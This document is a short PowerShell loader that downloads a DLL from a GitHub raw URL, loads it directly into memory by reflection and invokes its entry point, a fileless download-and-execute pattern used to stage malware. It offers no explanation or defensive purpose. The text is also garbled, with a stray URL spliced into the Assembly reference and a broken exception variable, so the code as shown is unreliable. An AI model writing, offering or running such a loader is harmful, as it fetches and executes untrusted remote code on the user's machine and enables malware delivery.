$dllUrl = "https://github.com/imreallyemo1337/KUTTHROATVONSECRETGITHUBREPO/raw/main/chxpo.dll"

# Download the DLL to a byte array
try {
    # Download the DLL to a byte array
    $fileData = (New-Object System.Net.WebClient).DownloadData($dllUrl)

    # Load the assembly into memory
    $assembly = System.Reflection.Assembly (http://ystem.reflection.assemblyy/)::Load($fileData)

    # Get the main entry point (i.e., main method) of the assembly
    $entryPoint = $assembly.EntryPoint

    # Invoke the main method
    if ($entryPoint -ne $null) {
        $entryPoint.Invoke($null, @())
    }
} catch {
    # Print error message if the DLL fails to load
    Write-Host "Failed to load the DLL: $($.Exception.Message)"
}
